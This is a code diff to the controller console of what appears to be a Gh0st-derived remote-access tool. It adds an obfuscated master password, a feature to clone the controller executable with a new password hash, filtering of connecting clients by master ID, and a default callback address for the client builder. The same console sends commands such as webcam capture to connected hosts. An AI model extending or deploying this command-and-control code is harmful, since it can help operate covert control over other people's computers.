@@ -24,6 +24,8 @@
 #include "CPasswordDlg.h"
 #include "pwd_gen.h"
 #include "DateVerify.h"
+#include <fstream>
+#include "common/skCrypter.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -198,6 +200,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
 	ON_WM_HELPINFO()
 	ON_COMMAND(ID_ONLINE_SHARE, &CMy2015RemoteDlg::OnOnlineShare)
 	ON_COMMAND(ID_TOOL_AUTH, &CMy2015RemoteDlg::OnToolAuth)
+	ON_COMMAND(ID_TOOL_GEN_MASTER, &CMy2015RemoteDlg::OnToolGenMaster)
 END_MESSAGE_MAP()
 
 
@@ -235,9 +238,15 @@ void CMy2015RemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)
 
 VOID CMy2015RemoteDlg::CreateSolidMenu()
 {
-	HMENU hMenu = LoadMenu(NULL,MAKEINTRESOURCE(IDR_MENU_MAIN));   //载入菜单资源
-	::SetMenu(this->GetSafeHwnd(),hMenu);                    //为窗口设置菜单
-	::DrawMenuBar(this->GetSafeHwnd());                      //显示菜单
+	m_MainMenu.LoadMenu(IDR_MENU_MAIN);
+	CMenu* SubMenu = m_MainMenu.GetSubMenu(1);
+	std::string masterHash(skCrypt(MASTER_HASH));
+	if (GetPwdHash() != masterHash) {
+		SubMenu->DeleteMenu(ID_TOOL_GEN_MASTER, MF_BYCOMMAND);
+	}
+
+	::SetMenu(this->GetSafeHwnd(), m_MainMenu.GetSafeHmenu()); //为窗口设置菜单
+	::DrawMenuBar(this->GetSafeHwnd());                        //显示菜单
 }
 
 VOID CMy2015RemoteDlg::CreatStatusBar()
@@ -644,7 +653,12 @@ void CMy2015RemoteDlg::OnTimer(UINT_PTR nIDEvent)
 		if (!CheckValid()) 
 		{
 			KillTimer(nIDEvent);
-			return OnMainExit();
+			CInputDialog dlg(this);
+			dlg.Init("输入密码", "输入主控程序的密码:");
+			dlg.DoModal();
+			if (hashSHA256(dlg.m_str.GetString()) != std::string(skCrypt(MASTER_HASH)))
+				return OnMainExit();
+			MessageBox("请及时对当前主控程序授权: 在工具菜单中生成口令!", "提示", MB_ICONWARNING);
 		}
 	}
 }
@@ -954,9 +968,9 @@ bool CMy2015RemoteDlg::CheckValid() {
 		auto settings = "settings", pwdKey = "Password";
 		// 验证口令
 		CPasswordDlg dlg;
-		std::string hardwareID = getHardwareID();
-		std::string hashedID = hashSHA256(hardwareID);
-		std::string deviceID = getFixedLengthID(hashedID);
+		static std::string hardwareID = getHardwareID();
+		static std::string hashedID = hashSHA256(hardwareID);
+		static std::string deviceID = getFixedLengthID(hashedID);
 		CString pwd = THIS_APP->m_iniFile.GetStr(settings, pwdKey, "");
 
 		dlg.m_sDeviceID = deviceID.c_str();
@@ -973,7 +987,7 @@ bool CMy2015RemoteDlg::CheckValid() {
 			return false;
 		}
 		std::vector<std::string> subvector(v.begin() + 2, v.end());
-		std::string password = v[0] + " - " + v[1] + ": " + PWD_HASH256;
+		std::string password = v[0] + " - " + v[1] + ": " + GetPwdHash();
 		std::string finalKey = deriveKey(password, deviceID);
 		std::string hash256 = joinString(subvector, '-');
 		std::string fixedKey = getFixedLengthID(finalKey);
@@ -981,7 +995,7 @@ bool CMy2015RemoteDlg::CheckValid() {
 			THIS_APP->m_iniFile.SetStr(settings, pwdKey, "");
 			if (pwd.IsEmpty() || (IDOK != dlg.DoModal() || hash256 != fixedKey)) {
 				if (!dlg.m_sPassword.IsEmpty())
-					MessageBox("口令错误, 无法生成服务端!", "提示", MB_ICONWARNING);
+					MessageBox("口令错误, 无法继续操作!", "提示", MB_ICONWARNING);
 				return false;
 			}
 		}
@@ -1002,9 +1016,9 @@ bool CMy2015RemoteDlg::CheckValid() {
 
 void CMy2015RemoteDlg::OnOnlineBuildClient()
 {
-	// 给新编译的程序14天试用期，过期之后生成服务端需要申请"序列号"；
+	// 给新编译的程序14天试用期，过期之后生成服务端需要申请"口令"；
 	// 如果要对其他功能乃至整个程序启动授权逻辑，将下述if语句添加到相应地方即可。
-	// 序列号包含授权日期范围，确保一机一码；授权逻辑会检测计算机日期未被篡改!
+	// 口令包含授权日期范围，确保一机一码；授权逻辑会检测计算机日期未被篡改!
 	// 注释下面 if 语句可以屏蔽该授权逻辑.
 	// 2025/04/20 
 	if (!CheckValid())
@@ -1014,6 +1028,7 @@ void CMy2015RemoteDlg::OnOnlineBuildClient()
 	CBuildDlg Dlg;
 	Dlg.m_strIP = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "localIp", "");
 	int Port = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "ghost");
+	Dlg.m_strIP = Dlg.m_strIP.IsEmpty() ? "127.0.0.1" : Dlg.m_strIP;
 	Dlg.m_strPort = Port <= 0 ? "6543" : std::to_string(Port).c_str();
 	Dlg.DoModal();
 }
@@ -1027,6 +1042,8 @@ VOID CMy2015RemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength)
 	{
 		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
 		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem);
+		if (!ContextObject->bLogin && szBuffer[0] != COMMAND_BYE)
+			continue;
 		if (szBuffer[0]== COMMAND_WEBCAM && ContextObject->sClientInfo[ONLINELIST_VIDEO] == CString("无"))
 		{
 			continue;
@@ -1359,6 +1376,11 @@ LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
 		LOGIN_INFOR* LoginInfor = new LOGIN_INFOR;
 		ContextObject->InDeCompressedBuffer.CopyBuffer((LPBYTE)LoginInfor, sizeof(LOGIN_INFOR), 0);
 
+		auto curID = GetMasterId();
+		ContextObject->bLogin = (LoginInfor->szMasterID == curID || strlen(LoginInfor->szMasterID)==0);
+		if (!ContextObject->bLogin) {
+			Mprintf("*** Received master '%s' client! ***\n", LoginInfor->szMasterID);
+		}
 		strIP = inet_ntoa(ClientAddr.sin_addr);
 
 		//主机名称
@@ -1368,7 +1390,13 @@ LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
 		strOS = LoginInfor->OsVerInfoEx;
 
 		//CPU
-		strCPU.Format("%dMHz", LoginInfor->dwCPUMHz);
+		if (LoginInfor->dwCPUMHz != -1)
+		{
+			strCPU.Format("%dMHz", LoginInfor->dwCPUMHz);
+		}
+		else {
+			strCPU = "Unknown";
+		}
 
 		//网速
 		strPing.Format("%d", LoginInfor->dwSpeed);
@@ -1522,6 +1550,8 @@ void CMy2015RemoteDlg::SendMasterSettings(CONTEXT_OBJECT* ctx) {
 		for (int i=0, n=m_CList_Online.GetItemCount(); i<n; ++i)
 		{
 			CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(i);
+			if (!ContextObject->bLogin)
+				continue;
 			m_iocpServer->Send(ContextObject, buf, sizeof(buf));
 		}
 		LeaveCriticalSection(&m_cs);
@@ -1761,4 +1791,102 @@ void CMy2015RemoteDlg::OnToolAuth()
 	dlg.m_sDeviceID = deviceID.c_str();
 
 	dlg.DoModal();
+}
+
+
+char* ReadCurrentExecutable(size_t& outSize) {
+	// 获取当前程序路径
+	char path[MAX_PATH];
+	DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
+	if (len == 0 || len == MAX_PATH) {
+		return nullptr;
+	}
+
+	// 打开文件
+	std::ifstream file(path, std::ios::binary | std::ios::ate); // ate = 跳到末尾获得大小
+	if (!file) {
+		return nullptr;
+	}
+
+	// 获取文件大小并分配内存
+	std::streamsize size = file.tellg();
+	file.seekg(0, std::ios::beg);
+	char* buffer = new char[size];
+
+	// 读取文件到 buffer
+	if (!file.read(buffer, size)) {
+		delete[] buffer;
+		return nullptr;
+	}
+
+	outSize = static_cast<size_t>(size);
+	return buffer;
+}
+
+
+void CMy2015RemoteDlg::OnToolGenMaster()
+{
+	CInputDialog pass(this);
+	pass.Init("主控生成", "当前主控程序的密码:");
+	if (pass.DoModal() != IDOK || pass.m_str.IsEmpty())
+		return;
+	std::string masterHash(skCrypt(MASTER_HASH));
+	if (hashSHA256(pass.m_str.GetBuffer()) != masterHash) {
+		MessageBox("密码不正确，无法生成主控程序!", "错误", MB_ICONWARNING);
+		return;
+	}
+
+	CInputDialog dlg(this);
+	dlg.Init("主控密码", "新的主控程序的密码:");
+	if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty())
+		return;
+	size_t size = 0;
+	char* curEXE = ReadCurrentExecutable(size);
+	if (curEXE == nullptr) {
+		MessageBox("读取文件失败! 请稍后再次尝试。", "错误", MB_ICONWARNING);
+		return;
+	}
+	std::string pwdHash = hashSHA256(dlg.m_str.GetString());
+	int iOffset = MemoryFind(curEXE, masterHash.c_str(), size, masterHash.length());
+	if (iOffset == -1) {
+		MessageBox("操作文件失败! 请稍后再次尝试。", "错误", MB_ICONWARNING);
+		SAFE_DELETE_ARRAY(curEXE);
+		return;
+	}
+	memcpy(curEXE + iOffset, pwdHash.c_str(), pwdHash.length());
+	CComPtr<IShellFolder> spDesktop;
+	HRESULT hr = SHGetDesktopFolder(&spDesktop);
+	if (FAILED(hr)) {
+		AfxMessageBox("Explorer 未正确初始化! 请稍后再试。");
+		SAFE_DELETE_ARRAY(curEXE);
+		return;
+	}
+	// 过滤器：显示所有文件和特定类型文件（例如文本文件）
+	CFileDialog fileDlg(FALSE, _T("exe"), "YAMA.exe", OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
+		_T("EXE Files (*.exe)|*.exe|All Files (*.*)|*.*||"), AfxGetMainWnd());
+	int ret = 0;
+	try {
+		ret = fileDlg.DoModal();
+	}
+	catch (...) {
+		AfxMessageBox("文件对话框未成功打开! 请稍后再试。");
+		SAFE_DELETE_ARRAY(curEXE);
+		return;
+	}
+	if (ret == IDOK)
+	{
+		CString name = fileDlg.GetPathName();
+		CFile File;
+		BOOL r = File.Open(name, CFile::typeBinary | CFile::modeCreate | CFile::modeWrite);
+		if (!r) {
+			MessageBox("主控程序创建失败!\r\n" + name, "提示", MB_ICONWARNING);
+			SAFE_DELETE_ARRAY(curEXE);
+			return;
+		}
+		File.Write(curEXE, size);
+		File.Close();
+
+		MessageBox("生成成功! 文件位于:\r\n" + name, "提示", MB_ICONINFORMATION);
+	}
+	SAFE_DELETE_ARRAY(curEXE);
 }
